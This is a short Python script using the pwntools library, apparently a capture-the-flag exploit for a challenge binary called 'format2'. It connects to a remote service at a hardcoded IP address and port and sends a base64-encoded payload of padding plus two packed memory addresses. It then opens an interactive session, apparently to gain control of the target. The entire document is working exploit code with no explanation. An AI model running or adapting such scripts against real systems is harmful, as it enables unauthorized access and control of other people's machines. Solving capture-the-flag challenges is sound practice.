from pwn import *

p=process("./format2")
p=remote("111.198.29.45","38675")
payload='aaaa'+p32(0x08049284)+p32(0x0811EB40)
p.recv()
p.sendline(base64.b64encode(payload))
p.interactive()